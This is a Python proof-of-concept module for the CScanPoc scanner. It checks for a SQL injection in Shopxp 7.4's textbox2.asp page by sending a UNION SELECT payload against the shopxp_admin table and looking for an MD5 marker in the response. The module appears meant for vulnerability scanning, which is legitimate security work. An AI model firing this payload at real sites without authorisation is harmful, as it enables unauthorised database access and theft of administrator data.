# coding: utf-8
import re
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Shopxp_0101' # 平台漏洞编号，留空
    name = 'Shopxp 7.4 /textbox2.asp SQL Injection' # 漏洞名称
    level = VulnLevel.HIGH # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-09-21'  # 漏洞公布时间
    desc = '''
    Shopxp 7.4 textbox2.asp sql injection.
    ''' # 漏洞描述
    ref = 'http://www.sebug.net/vuldb/ssvid-62319' # 漏洞来源
    cnvd_id = '' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Shopxp'  # 漏洞应用名称
    product_version = '7.4'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '09ed96a7-6673-480a-92bd-33b9e31966b8' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            payload = '/TEXTBOX2.ASP?action=modify&news%69d=122%20and%201=2%20union%20select%201,2,MD5(1),4,5,6,7%20from%20shopxp_admin'
            verify_url = self.target+ payload
            req = urllib2.urlopen(verify_url)
            content = req.read()
            if req.getcode()==200:
                if 'c4ca4238a0b923820dcc509a6f75849b' in content:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
                    
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()